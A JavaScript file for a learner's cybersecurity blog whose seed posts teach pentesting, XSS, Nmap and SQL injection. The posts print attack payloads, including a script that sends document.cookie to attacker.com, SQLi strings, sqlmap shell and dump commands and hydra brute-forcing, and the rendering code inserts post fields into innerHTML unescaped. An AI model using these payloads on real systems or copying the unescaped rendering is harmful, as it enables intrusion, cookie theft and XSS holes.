'use strict';

/* ─────────────────────────────────────
   DATA STORE
───────────────────────────────────── */
const STORAGE_KEY = 'cyberlog_posts_v1';
let state = { posts:[], activeTag:'All', currentPostId:null };

function loadPosts() {
  try {
    const raw = localStorage.getItem(STORAGE_KEY);
    if (raw) state.posts = JSON.parse(raw);
    else seedPosts();
  } catch { seedPosts(); }
}

function savePosts() {
  localStorage.setItem(STORAGE_KEY, JSON.stringify(state.posts));
  animateStatCounter();
}

function generateId() {
  return Date.now().toString(36) + Math.random().toString(36).slice(2,8);
}

/* ─────────────────────────────────────
   SEED DATA — cybersecurity posts
───────────────────────────────────── */
const CYBER_GRADIENTS = [
  'linear-gradient(135deg, #000a00 0%, #001a00 50%, #002200 100%)',
  'linear-gradient(135deg, #000810 0%, #001428 50%, #000a1a 100%)',
  'linear-gradient(135deg, #0a0005 0%, #1a000f 50%, #0d0008 100%)',
  'linear-gradient(135deg, #080800 0%, #181800 50%, #101000 100%)',
  'linear-gradient(135deg, #000a08 0%, #001a14 50%, #000e0a 100%)',
];

function seedPosts() {
  state.posts = [
    {
      id:'post-1',
      title:'Getting Started with Penetration Testing: A Beginner\'s Roadmap',
      excerpt:'From zero to your first pentest — the tools, mindset, and methodology every aspiring ethical hacker needs to know.',
      content:`## What is Penetration Testing?

Penetration testing (pentesting) is the authorized practice of attacking computer systems to find security weaknesses before malicious hackers do. As a CEH-certified professional, this is the foundation of everything.

## The 5 Phases of Ethical Hacking

Every professional pentest follows a structured methodology:

1. **Reconnaissance** — Gather information about the target
2. **Scanning** — Discover open ports, services, vulnerabilities
3. **Gaining Access** — Exploit vulnerabilities
4. **Maintaining Access** — Establish persistence (for assessment)
5. **Reporting** — Document findings and remediation steps

## Essential Tools

\`\`\`bash
# Network scanning
nmap -sV -sC -O target.com

# Web vulnerability scanning
nikto -h http://target.com

# Directory brute forcing
gobuster dir -u http://target.com -w /usr/share/wordlists/common.txt

# Password testing
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://target.com
\`\`\`

## Setting Up Your Lab

Never test on systems you don't own. Build a local lab:

- **Kali Linux** — Your attack machine
- **Metasploitable2** — Intentionally vulnerable target
- **DVWA** — Damn Vulnerable Web Application
- **VulnHub / HackTheBox** — Online practice platforms

> The most dangerous hacker is the one who has been a developer. Understand how systems are built to understand how they break.

## Key Mindset Principles

- Think like an attacker, report like a professional
- Document everything — screenshots, commands, timestamps
- Never exceed your authorized scope
- Always have written permission before you start`,
      tags:['Pentesting','CEH','Beginner','Methodology'],
      date:'2025-12-10', readTime:9, featured:true,
      gradient: CYBER_GRADIENTS[0],
    },
    {
      id:'post-2',
      title:'Web Application Security: XSS Attacks Deep Dive',
      excerpt:'Cross-Site Scripting (XSS) remains one of the most prevalent web vulnerabilities. Learn how attackers find and exploit it — and how to prevent it.',
      content:`## Understanding XSS

Cross-Site Scripting (XSS) allows attackers to inject malicious scripts into web pages viewed by other users. It's in the OWASP Top 10 for a reason — it's everywhere.

## Types of XSS

### Reflected XSS
The payload is in the URL and reflected back immediately:

\`\`\`html
https://vulnerable.com/search?q=<script>alert('XSS')</script>
\`\`\`

### Stored XSS
The payload is stored in the database and served to all visitors:

\`\`\`javascript
// Malicious comment stored in DB:
<script>
  fetch('https://attacker.com/steal?c=' + document.cookie)
</script>
\`\`\`

### DOM-based XSS
Exploits client-side JavaScript that writes user input to the DOM:

\`\`\`javascript
// Vulnerable code
document.getElementById('out').innerHTML = location.hash.slice(1);

// Attack URL:
// https://site.com/#<img src=x onerror=alert(1)>
\`\`\`

## Finding XSS with Burp Suite

\`\`\`bash
# 1. Set Burp as proxy (127.0.0.1:8080)
# 2. Browse the app, intercept requests
# 3. Send to Intruder/Repeater
# 4. Test payloads:

<script>alert(1)</script>
<img src=x onerror=alert(1)>
"><script>alert(1)</script>
javascript:alert(1)
\`\`\`

## Prevention

- **Encode output** — HTML encode all user-supplied data
- **Use CSP** — Content Security Policy headers
- **Validate input** — Allowlist, never blocklist
- **HttpOnly cookies** — Prevent JS cookie access

> Every input field is a potential attack surface. Treat all user input as untrusted.`,
      tags:['Web Security','XSS','OWASP','Burp Suite'],
      date:'2025-11-25', readTime:10, featured:true,
      gradient: CYBER_GRADIENTS[1],
    },
    {
      id:'post-3',
      title:'Nmap Mastery: From Basic Scans to Advanced Techniques',
      excerpt:'Nmap is the Swiss Army knife of network reconnaissance. This guide covers everything from basic port scanning to OS fingerprinting and NSE scripts.',
      content:`## Why Nmap?

Network Mapper (Nmap) is the industry-standard tool for network discovery and security auditing. Every pentest starts here.

## Essential Scan Types

\`\`\`bash
# Basic TCP scan
nmap 192.168.1.1

# Stealth SYN scan (requires root)
nmap -sS 192.168.1.1

# Service/version detection
nmap -sV 192.168.1.1

# OS detection
nmap -O 192.168.1.1

# The "Aggressive" scan (all of the above)
nmap -A 192.168.1.1

# Scan entire subnet
nmap 192.168.1.0/24
\`\`\`

## Output Formats

\`\`\`bash
# Save in all formats
nmap -oA scan_results target.com

# XML output (for import into other tools)
nmap -oX results.xml target.com

# Grepable output
nmap -oG results.gnmap target.com
\`\`\`

## NSE Scripts

Nmap Scripting Engine (NSE) extends functionality massively:

\`\`\`bash
# Check for common vulnerabilities
nmap --script vuln target.com

# SMB vulnerability check
nmap --script smb-vuln-ms17-010 target.com

# HTTP enumeration
nmap --script http-enum target.com

# List available scripts
ls /usr/share/nmap/scripts/ | grep http
\`\`\`

## Evading Detection

\`\`\`bash
# Slow scan (evades IDS timing rules)
nmap -T1 target.com

# Decoy scan
nmap -D RND:10 target.com

# Fragment packets
nmap -f target.com
\`\`\`

> A good recon phase determines the quality of your entire pentest. Never rush Nmap.`,
      tags:['Nmap','Reconnaissance','Networking','Tools'],
      date:'2025-10-30', readTime:11, featured:false,
      gradient: CYBER_GRADIENTS[2],
    },
    {
      id:'post-4',
      title:'Building a Secure Login Page: Frontend Security Best Practices',
      excerpt:'As a frontend developer who thinks like a hacker, here\'s how to build authentication UIs that resist common attacks.',
      content:`## Frontend Security Is Real Security

Most security advice focuses on the backend. But frontend implementation mistakes directly enable attacks. Here's what I apply as someone who bridges both worlds.

## Secure Password Input

\`\`\`html
<!-- Never disable paste — it discourages strong passwords -->
<input 
  type="password" 
  id="password"
  autocomplete="current-password"
  spellcheck="false"
  autocorrect="off"
/>
\`\`\`

## Prevent Clickjacking

\`\`\`javascript
// In your meta tags / CSP header
<meta http-equiv="X-Frame-Options" content="DENY" />

// Better: use CSP header from server
Content-Security-Policy: frame-ancestors 'none';
\`\`\`

## Rate Limiting on the Frontend

\`\`\`javascript
// Implement client-side rate limiting (defense in depth)
let attempts = 0;
const MAX_ATTEMPTS = 5;
const LOCKOUT_MS = 15 * 60 * 1000; // 15 minutes

async function handleLogin(credentials) {
  if (attempts >= MAX_ATTEMPTS) {
    showError('Too many attempts. Try again in 15 minutes.');
    return;
  }
  
  try {
    await loginAPI(credentials);
    attempts = 0;
  } catch (err) {
    attempts++;
    if (attempts >= MAX_ATTEMPTS) {
      setTimeout(() => attempts = 0, LOCKOUT_MS);
    }
    showError('Invalid credentials');
  }
}
\`\`\`

## Prevent Credential Stuffing Exposure

\`\`\`javascript
// Always use generic error messages
// BAD:
if (!user) showError('User not found');
if (!passwordMatch) showError('Wrong password');

// GOOD:
showError('Invalid email or password');
\`\`\`

## Content Security Policy

\`\`\`html
<meta http-equiv="Content-Security-Policy" 
  content="default-src 'self'; script-src 'self'; style-src 'self';">
\`\`\`

> The best login page is one an attacker can't even probe effectively.`,
      tags:['Frontend','Web Security','JavaScript','Authentication'],
      date:'2025-09-18', readTime:7, featured:false,
      gradient: CYBER_GRADIENTS[3],
    },
    {
      id:'post-5',
      title:'SQL Injection Explained: Finding and Exploiting SQLi',
      excerpt:'SQL Injection is one of the oldest and most dangerous vulnerabilities. This post covers manual detection, exploitation with SQLMap, and proper prevention.',
      content:`## What is SQL Injection?

SQL Injection (SQLi) occurs when user-supplied input is included in SQL queries without proper sanitization. Still ranked in the OWASP Top 10 after decades.

## Manual Detection

Start with basic payloads in every input field:

\`\`\`sql
-- Single quote test
'

-- Boolean tests
1 AND 1=1 -- (true)
1 AND 1=2 -- (false, different response = vulnerable!)

-- Time-based blind
1; WAITFOR DELAY '0:0:5'--   (MSSQL)
1; SELECT SLEEP(5)--          (MySQL)
\`\`\`

## Error-Based SQLi

If errors are shown, extract database info:

\`\`\`sql
-- Get database version
' UNION SELECT @@version--

-- Get database name
' UNION SELECT database()--

-- List tables
' UNION SELECT table_name FROM information_schema.tables--
\`\`\`

## Automating with SQLMap

\`\`\`bash
# Basic scan
sqlmap -u "http://target.com/page?id=1"

# POST request
sqlmap -u "http://target.com/login" --data="user=admin&pass=test"

# Dump entire database
sqlmap -u "http://target.com/page?id=1" --dump-all

# With cookies (for authenticated pages)
sqlmap -u "http://target.com/profile" --cookie="session=abc123"

# Get a shell (if possible)
sqlmap -u "http://target.com/page?id=1" --os-shell
\`\`\`

## Prevention

\`\`\`python
# WRONG — vulnerable to SQLi
query = "SELECT * FROM users WHERE name = '" + user_input + "'"

# RIGHT — parameterized query
cursor.execute("SELECT * FROM users WHERE name = ?", (user_input,))
\`\`\`

> Always use parameterized queries or prepared statements. ORMs help but aren't foolproof — always validate the generated SQL.`,
      tags:['SQL Injection','OWASP','SQLMap','Database'],
      date:'2025-08-12', readTime:12, featured:false,
      gradient: CYBER_GRADIENTS[4],
    },
  ];
  savePosts();
}

/* ─────────────────────────────────────
   CERTIFICATIONS DATA
───────────────────────────────────── */
const CERTS_DATA = [
  {
    icon:'🛡️',
    name:'Certified Ethical Hacker (CEH)',
    issuer:'CyberPathSala',
    desc:'Comprehensive ethical hacking certification covering penetration testing methodologies, attack techniques, and defensive strategies across all major attack vectors.',
    skills:['Penetration Testing','Network Security','Web App Security','Social Engineering','Malware Analysis','Cryptography','Cloud Security'],
    badge:'CEH CERTIFIED',
    badgeClass:'',
    year:'2025',
  },
  {
    icon:'💻',
    name:'Frontend Development',
    issuer:'CyberPathSala',
    desc:'Full-stack frontend development training covering modern HTML5, CSS3, JavaScript (ES6+), responsive design, and building secure, performant web applications.',
    skills:['HTML5','CSS3','JavaScript','React','Responsive Design','Web Security','Performance'],
    badge:'FRONTEND DEV',
    badgeClass:'frontend',
    year:'2024',
  },
];

/* ─────────────────────────────────────
   ROUTING
───────────────────────────────────── */
function showPage(page) {
  document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
  document.querySelectorAll('.nav-link').forEach(l => l.classList.remove('active'));
  const pg = document.getElementById(`page-${page}`);
  if (pg) pg.classList.add('active');
  const nl = document.getElementById(`nav-${page}`);
  if (nl) nl.classList.add('active');
  window.scrollTo({ top:0, behavior:'smooth' });
  if (page==='home')   renderHome();
  if (page==='blog')   renderBlogGrid();
  if (page==='skills') renderSkills();
  if (page==='certs')  renderCerts();
}

function showPost(postId) {
  state.currentPostId = postId;
  document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
  document.querySelectorAll('.nav-link').forEach(l => l.classList.remove('active'));
  document.getElementById('nav-blog').classList.add('active');
  document.getElementById('page-post').classList.add('active');
  renderPost(postId);
  window.scrollTo({ top:0, behavior:'smooth' });
}

/* ─────────────────────────────────────
   HELPERS
───────────────────────────────────── */
function formatDate(d) {
  return new Date(d).toLocaleDateString('en-US',{year:'numeric',month:'long',day:'numeric'});
}

function getGradient(post,i) {
  return post.gradient || CYBER_GRADIENTS[i % CYBER_GRADIENTS.length];
}

function buildCard(post, i, large=false) {
  const tagHtml = post.tags.slice(0,3).map(t=>`<span class="tag-chip">${t}</span>`).join('');
  const cover = post.cover
    ? `<div class="card-cover-wrap"><img class="card-cover" src="${post.cover}" alt="" loading="lazy"/></div>`
    : `<div class="card-gradient-cover" style="background:${getGradient(post,i)}"></div>`;
  const fb = (post.featured && large) ? `<div class="featured-badge">⚡ FEATURED</div>` : '';
  return `
    <div class="blog-card${large?' featured':''}" onclick="showPost('${post.id}')" tabindex="0" role="article" aria-label="${post.title}">
      <div style="position:relative">${fb}${cover}</div>
      <div class="card-body">
        <div class="card-tags">${tagHtml}</div>
        <h2 class="card-title">${post.title}</h2>
        <p class="card-excerpt">${post.excerpt}</p>
        <div class="card-meta">
          <time datetime="${post.date}">${formatDate(post.date)}</time>
          <span class="read-time">${post.readTime} min read</span>
        </div>
      </div>
    </div>`;
}

/* ─────────────────────────────────────
   HOME PAGE
───────────────────────────────────── */
function renderHome() {
  const sorted = [...state.posts].sort((a,b)=>new Date(b.date)-new Date(a.date));
  const featured = sorted.filter(p=>p.featured).slice(0,2);
  const fill = sorted.filter(p=>!p.featured);
  const display = featured.length>=2 ? featured : [...featured,...fill].slice(0,2);

  const fg = document.getElementById('featured-grid');
  if (fg) fg.innerHTML = display.length
    ? display.map((p,i)=>buildCard(p,i,i===0)).join('')
    : `<div class="empty-state"><div class="empty-icon">📝</div><p class="t-prompt">// No posts yet. Write your first one!</p></div>`;

  const rl = document.getElementById('recent-list');
  if (rl) {
    const recent = sorted.slice(0,5);
    rl.innerHTML = recent.length ? recent.map((p,i)=>{
      const tagHtml = p.tags.slice(0,2).map(t=>`<span class="tag-chip" style="font-size:.62rem;padding:2px 8px">${t}</span>`).join('');
      return `
        <div class="recent-item" onclick="showPost('${p.id}')" tabindex="0">
          <span class="recent-num">${String(i+1).padStart(2,'0')}</span>
          <div class="recent-content">
            <div class="recent-title">${p.title}</div>
            <div class="recent-tags">${tagHtml}</div>
          </div>
          <span class="recent-meta">${p.readTime}min · ${formatDate(p.date)}</span>
        </div>`;
    }).join('') : `<p class="t-prompt">// No posts yet.</p>`;
  }

  animateStatCounter();
}

function animateStatCounter() {
  const el = document.getElementById('stat-posts');
  if (!el) return;
  let c=0; const t=state.posts.length;
  const iv = setInterval(()=>{
    c++; el.textContent=c;
    if(c>=t) clearInterval(iv);
  }, 50);
}

/* ─────────────────────────────────────
   BLOG GRID
───────────────────────────────────── */
function getAllTags() {
  const s = new Set(['All']);
  state.posts.forEach(p=>p.tags.forEach(t=>s.add(t)));
  return [...s];
}

function renderTagFilters() {
  const el = document.getElementById('tag-filters');
  if (!el) return;
  el.innerHTML = getAllTags().map(t=>
    `<button class="filter-chip${t===state.activeTag?' active':''}" onclick="setActiveTag('${t}')">${t}</button>`
  ).join('');
}

function setActiveTag(tag) { state.activeTag=tag; renderBlogGrid(); }

function filterPosts() { renderBlogGrid(); }

function renderBlogGrid() {
  renderTagFilters();
  const q = (document.getElementById('search-input')?.value||'').toLowerCase();
  const sorted = [...state.posts].sort((a,b)=>new Date(b.date)-new Date(a.date));
  const filtered = sorted.filter(p=>{
    const mT = state.activeTag==='All' || p.tags.includes(state.activeTag);
    const mQ = !q || p.title.toLowerCase().includes(q) || p.excerpt.toLowerCase().includes(q) || p.tags.some(t=>t.toLowerCase().includes(q));
    return mT && mQ;
  });
  const grid  = document.getElementById('blog-grid');
  const empty = document.getElementById('blog-empty');
  if (!grid) return;
  if (filtered.length===0) { grid.innerHTML=''; if(empty) empty.style.display='block'; return; }
  if (empty) empty.style.display='none';
  grid.innerHTML = filtered.map((p,i)=>buildCard(p,i,false)).join('');
}

/* ─────────────────────────────────────
   SINGLE POST
───────────────────────────────────── */
function renderPost(postId) {
  const post = state.posts.find(p=>p.id===postId);
  if (!post) return;
  const article  = document.getElementById('post-article');
  const metaCard = document.getElementById('post-meta-card');
  const tocList  = document.getElementById('toc-list');

  const contentHtml = markdownToHtml(post.content);
  const tagHtml = post.tags.map(t=>`<span class="tag-chip">${t}</span>`).join('');
  const cover = post.cover
    ? `<div class="post-cover-img"><img src="${post.cover}" alt="${post.title}"/></div>`
    : `<div class="post-cover-gradient" style="background:${getGradient(post,0)}"></div>`;

  article.innerHTML = `
    <div class="post-header">
      <div class="post-tags">${tagHtml}</div>
      <h1>${post.title}</h1>
      <div class="post-meta-bar">
        <time datetime="${post.date}">📅 ${formatDate(post.date)}</time>
        <span>⏱ ${post.readTime} min read</span>
        ${post.featured?'<span>⚡ Featured</span>':''}
      </div>
    </div>
    ${cover}
    <div class="post-content" id="post-content-body">${contentHtml}</div>`;

  metaCard.innerHTML = `
    <h4>// post.info</h4>
    <div class="meta-item"><span class="meta-key">date</span><span class="meta-val">${post.date}</span></div>
    <div class="meta-item"><span class="meta-key">read_time</span><span class="meta-val">${post.readTime}min</span></div>
    <div class="meta-item"><span class="meta-key">tags</span><span class="meta-val">${post.tags.length}</span></div>
    <div class="meta-item"><span class="meta-key">featured</span><span class="meta-val">${post.featured?'true':'false'}</span></div>
    <div class="post-actions">
      <button class="post-action-btn btn-edit" onclick="editPost('${post.id}')">✏️ edit</button>
      <button class="post-action-btn btn-delete" onclick="deletePost('${post.id}')">rm -rf post</button>
    </div>`;

  // TOC
  const headings = article.querySelectorAll('h2,h3');
  tocList.innerHTML = '';
  headings.forEach((h,i)=>{
    h.id=`h-${i}`;
    const li = document.createElement('li');
    li.className = `toc-item${h.tagName==='H3'?' toc-h3':''}`;
    li.textContent = h.textContent;
    li.onclick = ()=>h.scrollIntoView({behavior:'smooth',block:'start'});
    tocList.appendChild(li);
  });
}

/* ─────────────────────────────────────
   MARKDOWN PARSER
───────────────────────────────────── */
function markdownToHtml(md) {
  if (!md) return '';
  let html = md.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
  html = html.replace(/```(\w*)\n([\s\S]*?)```/g,(_,lang,code)=>`<pre><code class="lang-${lang}">${code.trim()}</code></pre>`);
  const lines = html.split('\n');
  const out=[]; let inList=false;
  for (let i=0;i<lines.length;i++) {
    const line=lines[i];
    if (line.startsWith('<pre>')||line.startsWith('</pre>')){
      if(inList){out.push('</ul>');inList=false;}
      out.push(line); continue;
    }
    if (/^#{1,6}\s/.test(line)) {
      if(inList){out.push('</ul>');inList=false;}
      const lvl=line.match(/^(#+)/)[1].length;
      out.push(`<h${lvl}>${inlineFmt(line.replace(/^#+\s/,''))}</h${lvl}>`); continue;
    }
    if (line.startsWith('&gt;')) {
      if(inList){out.push('</ul>');inList=false;}
      out.push(`<blockquote>${inlineFmt(line.replace(/^&gt;\s*/,''))}</blockquote>`); continue;
    }
    if (/^[-*]\s/.test(line)) {
      if(!inList){out.push('<ul>');inList=true;}
      out.push(`<li>${inlineFmt(line.replace(/^[-*]\s/,''))}</li>`); continue;
    }
    if (/^\d+\.\s/.test(line)) {
      if(inList){out.push('</ul>');inList=false;}
      out.push(`<li>${inlineFmt(line.replace(/^\d+\.\s/,''))}</li>`); continue;
    }
    if (/^---+$/.test(line.trim())) {
      if(inList){out.push('</ul>');inList=false;}
      out.push('<hr/>'); continue;
    }
    if (line.trim()==='') { if(inList){out.push('</ul>');inList=false;} continue; }
    if(inList){out.push('</ul>');inList=false;}
    out.push(`<p>${inlineFmt(line)}</p>`);
  }
  if(inList) out.push('</ul>');
  return out.join('\n');
}

function inlineFmt(t) {
  return t
    .replace(/\*\*(.+?)\*\*/g,'<strong>$1</strong>')
    .replace(/\*(.+?)\*/g,'<em>$1</em>')
    .replace(/`(.+?)`/g,'<code>$1</code>')
    .replace(/\[(.+?)\]\((.+?)\)/g,'<a href="$2" target="_blank" rel="noopener">$1</a>');
}

/* ─────────────────────────────────────
   SKILLS PAGE
───────────────────────────────────── */
const SKILLS_DATA = [
  {
    category:'// Offensive Security (Learning)',
    skills:[
      {name:'Penetration Testing', icon:'🎯', level:30, years:'Learning'},
      {name:'Nmap',               icon:'🔍', level:45, years:'Beginner'},
      {name:'Burp Suite',         icon:'🕷️', level:35, years:'Beginner'},
      {name:'Metasploit',         icon:'💀', level:25, years:'Learning'},
      {name:'SQLMap',             icon:'🗃️', level:30, years:'Learning'},
      {name:'Wireshark',          icon:'🦈', level:35, years:'Beginner'},
    ],
  },
  {
    category:'// Security Concepts (Studying)',
    skills:[
      {name:'OWASP Top 10',       icon:'🛡️', level:40, years:'Studying'},
      {name:'Network Security',   icon:'🔌', level:35, years:'Studying'},
      {name:'Web App Security',   icon:'🌐', level:40, years:'Studying'},
      {name:'Social Engineering', icon:'🎭', level:25, years:'Studying'},
      {name:'Cryptography',       icon:'🔐', level:20, years:'Learning'},
      {name:'Linux / Kali',       icon:'🐧', level:40, years:'Beginner'},
    ],
  },
  {
    category:'// Frontend Development',
    skills:[
      {name:'HTML5',              icon:'📄', level:65, years:'2 months'},
      {name:'CSS3',               icon:'🎨', level:60, years:'2 months'},
      {name:'JavaScript',         icon:'⚡', level:45, years:'2 months'},
      {name:'Responsive Design',  icon:'📱', level:55, years:'2 months'},
      {name:'Git',                icon:'🌿', level:40, years:'Beginner'},
      {name:'VS Code',            icon:'💙', level:70, years:'2 months'},
    ],
  },
  {
    category:'// Tools & Environment',
    skills:[
      {name:'Kali Linux',         icon:'🖤', level:35, years:'Learning'},
      {name:'VirtualBox',         icon:'📦', level:45, years:'Beginner'},
      {name:'Gobuster',           icon:'🚪', level:30, years:'Learning'},
      {name:'Hydra',              icon:'🐉', level:25, years:'Learning'},
      {name:'Nikto',              icon:'🔎', level:30, years:'Learning'},
      {name:'Nmap',               icon:'🔍', level:45, years:'Beginner'},
    ],
  },
];

function renderSkills() {
  const c = document.getElementById('skills-categories');
  if (!c) return;
  c.innerHTML = SKILLS_DATA.map(cat=>`
    <div>
      <div class="skill-category-title">${cat.category}</div>
      <div class="skills-grid">
        ${cat.skills.map(s=>`
          <div class="skill-card" tabindex="0">
            <span class="skill-icon">${s.icon}</span>
            <div class="skill-name">${s.name}</div>
            <div class="skill-level-bar">
              <div class="skill-level-fill" data-width="${s.level}%" style="width:0%"></div>
            </div>
            <div class="skill-years">${s.years}</div>
          </div>`).join('')}
      </div>
    </div>`).join('');

  const bars = c.querySelectorAll('.skill-level-fill');
  const io = new IntersectionObserver(entries=>{
    entries.forEach(e=>{
      if (e.isIntersecting) { setTimeout(()=>{ e.target.style.width=e.target.dataset.width; },80); io.unobserve(e.target); }
    });
  },{threshold:0.3});
  bars.forEach(b=>io.observe(b));
}

/* ─────────────────────────────────────
   CERTS PAGE
───────────────────────────────────── */
function renderCerts() {
  const c = document.getElementById('certs-grid');
  if (!c) return;
  c.innerHTML = CERTS_DATA.map(cert=>`
    <div class="cert-card">
      <div class="cert-card-top">
        <div class="cert-icon">${cert.icon}</div>
        <div class="cert-header">
          <div class="cert-issuer">${cert.issuer}</div>
          <div class="cert-name">${cert.name}</div>
        </div>
      </div>
      <p class="cert-desc">${cert.desc}</p>
      <div class="cert-skills">
        ${cert.skills.map(s=>`<span class="cert-skill-chip">${s}</span>`).join('')}
      </div>
      <div class="cert-footer">
        <span class="cert-badge ${cert.badgeClass}">${cert.badge}</span>
        <span class="cert-date">📅 ${cert.year}</span>
      </div>
    </div>`).join('');
}

/* ─────────────────────────────────────
   EDITOR
───────────────────────────────────── */
function showEditor() {
  document.getElementById('editor-modal-title').textContent='nano new-post.md';
  document.getElementById('editor-post-id').value='';
  ['post-title','post-excerpt','post-cover','post-tags','post-read-time','post-content']
    .forEach(id=>document.getElementById(id).value='');
  document.getElementById('post-featured').checked=false;
  document.getElementById('save-btn').textContent=':wq — Publish';
  document.getElementById('editor-overlay').classList.add('open');
  document.getElementById('post-title').focus();
}

function editPost(postId) {
  const p = state.posts.find(x=>x.id===postId);
  if (!p) return;
  document.getElementById('editor-modal-title').textContent=`nano ${postId}.md`;
  document.getElementById('editor-post-id').value=postId;
  document.getElementById('post-title').value=p.title;
  document.getElementById('post-excerpt').value=p.excerpt;
  document.getElementById('post-cover').value=p.cover||'';
  document.getElementById('post-tags').value=p.tags.join(', ');
  document.getElementById('post-read-time').value=p.readTime;
  document.getElementById('post-content').value=p.content;
  document.getElementById('post-featured').checked=!!p.featured;
  document.getElementById('save-btn').textContent=':wq — Save Changes';
  document.getElementById('editor-overlay').classList.add('open');
}

function closeEditor() {
  document.getElementById('editor-overlay').classList.remove('open');
  document.getElementById('editor-preview').style.display='none';
  document.getElementById('post-content').style.display='';
  document.getElementById('editor-split').classList.remove('preview-mode');
  previewOpen=false;
}

function savePost() {
  const title   = document.getElementById('post-title').value.trim();
  const excerpt = document.getElementById('post-excerpt').value.trim();
  const content = document.getElementById('post-content').value.trim();
  const cover   = document.getElementById('post-cover').value.trim();
  const tagsRaw = document.getElementById('post-tags').value.trim();
  const rt      = parseInt(document.getElementById('post-read-time').value)||5;
  const featured= document.getElementById('post-featured').checked;
  const editId  = document.getElementById('editor-post-id').value;

  if (!title||!excerpt||!content) { showToast('Title, excerpt, and content are required.','error'); return; }
  const tags = tagsRaw ? tagsRaw.split(',').map(t=>t.trim()).filter(Boolean) : ['Cybersecurity'];

  if (editId) {
    const idx = state.posts.findIndex(p=>p.id===editId);
    if (idx!==-1) state.posts[idx]={...state.posts[idx],title,excerpt,content,cover,tags,readTime:rt,featured};
    savePosts(); closeEditor();
    showToast('Post updated! ✅','success');
    if (state.currentPostId===editId) renderPost(editId); else showPost(editId);
  } else {
    state.posts.unshift({
      id:generateId(), title, excerpt, content, cover, tags,
      readTime:rt, featured,
      date:new Date().toISOString().slice(0,10),
      gradient:CYBER_GRADIENTS[state.posts.length%CYBER_GRADIENTS.length],
    });
    savePosts(); closeEditor();
    showToast('Post published! 🚀','success');
    showPost(state.posts[0].id);
  }
}

function deletePost(postId) {
  if (!confirm('Delete this post? Cannot be undone.')) return;
  state.posts = state.posts.filter(p=>p.id!==postId);
  savePosts(); showToast('Post deleted.','success'); showPage('blog');
}

/* Editor utilities */
function insertMd(before,after) {
  const ta=document.getElementById('post-content');
  const s=ta.selectionStart, e=ta.selectionEnd, sel=ta.value.slice(s,e);
  ta.value=ta.value.slice(0,s)+before+sel+after+ta.value.slice(e);
  ta.selectionStart=s+before.length; ta.selectionEnd=s+before.length+sel.length;
  ta.focus();
}

let previewOpen=false;
function togglePreview() {
  previewOpen=!previewOpen;
  const pv=document.getElementById('editor-preview');
  const sp=document.getElementById('editor-split');
  const btn=document.getElementById('preview-toggle');
  const ta=document.getElementById('post-content');
  if (previewOpen) {
    pv.style.display='block'; sp.classList.add('preview-mode');
    btn.textContent='✏️ Edit';
    pv.innerHTML=`<div class="post-content">${markdownToHtml(ta.value)}</div>`;
  } else {
    pv.style.display='none'; sp.classList.remove('preview-mode');
    btn.textContent='👁 Preview';
  }
}

/* ─────────────────────────────────────
   TOAST
───────────────────────────────────── */
function showToast(msg,type='success') {
  const t=document.getElementById('toast');
  t.textContent=msg; t.className=`toast ${type} show`;
  setTimeout(()=>t.classList.remove('show'),3200);
}

/* ─────────────────────────────────────
   MOBILE MENU
───────────────────────────────────── */
function toggleMobile() {
  document.getElementById('mobile-menu').classList.toggle('open');
}

/* ─────────────────────────────────────
   MATRIX RAIN
───────────────────────────────────── */
function initMatrix() {
  const canvas=document.getElementById('matrix-canvas');
  const ctx=canvas.getContext('2d');
  let W,H,cols,drops;

  function resize() {
    W=canvas.width=window.innerWidth;
    H=canvas.height=window.innerHeight;
    cols=Math.floor(W/18);
    drops=Array(cols).fill(1);
  }

  const chars='アイウエオカキクケコサシスセソタチツテトナニヌネノ0123456789ABCDEF<>/{}[]()';

  function draw() {
    ctx.fillStyle='rgba(0,10,0,0.04)';
    ctx.fillRect(0,0,W,H);
    ctx.fillStyle='#00ff41';
    ctx.font='14px Share Tech Mono';
    for (let i=0;i<drops.length;i++) {
      const c=chars[Math.floor(Math.random()*chars.length)];
      ctx.fillStyle = Math.random()>0.9 ? '#00ffff' : '#00ff41';
      ctx.globalAlpha = Math.random()*0.5+0.3;
      ctx.fillText(c, i*18, drops[i]*18);
      if (drops[i]*18>H && Math.random()>0.975) drops[i]=0;
      drops[i]++;
    }
    ctx.globalAlpha=1;
  }

  resize();
  window.addEventListener('resize',resize);
  setInterval(draw,50);
}

/* ─────────────────────────────────────
   CURSOR CROSSHAIR
───────────────────────────────────── */
function initCursor() {
  const c=document.getElementById('cursor-cross');
  document.addEventListener('mousemove',e=>{
    c.style.left=e.clientX+'px';
    c.style.top=e.clientY+'px';
  });
}

/* ─────────────────────────────────────
   NAVBAR SCROLL
───────────────────────────────────── */
function initNavbar() {
  window.addEventListener('scroll',()=>{
    document.getElementById('navbar').classList.toggle('scrolled',window.scrollY>40);
  },{passive:true});
}

/* ─────────────────────────────────────
   HERO TYPING EFFECT
───────────────────────────────────── */
function initTypingEffect() {
  const steps = [
    { id:'typed-cmd', text:'whoami', delay:80 },
  ];
  const outputs = [
    { id:'term-output',  text:'> role: student | ceh_learner | frontend_beginner', delay:200 },
    { id:'term-output2', text:'> cert: CyberPathSala :: CEH | frontend: 2 months', delay:100 },
    { id:'term-output3', text:'> status: [LEARNING] — Building skills from zero 🌱', delay:100 },
  ];

  let i=0;
  const cmd=document.getElementById('typed-cmd');
  if (!cmd) return;
  const str=steps[0].text;

  function typeChar() {
    if (i<str.length) {
      cmd.textContent+=str[i++];
      setTimeout(typeChar, 90);
    } else {
      setTimeout(()=>showOutputs(0), 300);
    }
  }

  function showOutputs(idx) {
    if (idx>=outputs.length) return;
    const el=document.getElementById(outputs[idx].id);
    if (el) { el.style.display='block'; el.textContent=outputs[idx].text; }
    setTimeout(()=>showOutputs(idx+1), outputs[idx].delay+400);
  }

  setTimeout(typeChar, 800);
}

/* ─────────────────────────────────────
   A11Y
───────────────────────────────────── */
function initA11y() {
  document.addEventListener('keydown',e=>{
    if ((e.key==='Enter'||e.key===' ') && e.target.hasAttribute('tabindex')) { e.preventDefault(); e.target.click(); }
    if (e.key==='Escape') closeEditor();
  });
  document.getElementById('editor-overlay').addEventListener('click',e=>{ if(e.target===e.currentTarget) closeEditor(); });
}

/* ─────────────────────────────────────
   INIT
───────────────────────────────────── */
document.addEventListener('DOMContentLoaded',()=>{
  loadPosts();
  initMatrix();
  initCursor();
  initNavbar();
  initTypingEffect();
  initA11y();
